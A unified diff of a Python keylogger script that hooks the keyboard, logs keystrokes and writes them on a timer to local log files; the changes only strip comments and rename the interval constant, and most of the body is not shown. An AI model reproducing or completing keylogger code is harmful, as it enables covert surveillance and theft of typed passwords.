@@ -1,9 +1,9 @@
 import keyboard
 from threading import Timer
 from datetime import datetime
-import os  # Add this import
+import os
 
-SEND_REPORT_EVERY = 60 # Seconds
+Tme= 60
 
 class Keylogger:
     def __init__(self, interval, report_method = "file"):
@@ -33,7 +33,6 @@ class Keylogger:
             self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
 
     def report_to_file(self):
-            # Create logs directory if it doesn't exist
             if not os.path.exists("logs"):
                 os.makedirs("logs")
                 
@@ -60,5 +59,5 @@ class Keylogger:
         keyboard.wait()
 
 if __name__ == "__main__":
-    keylogger = Keylogger(interval = SEND_REPORT_EVERY, report_method = "file")
+    keylogger = Keylogger(interval = Tme, report_method = "file")
     keylogger.start()
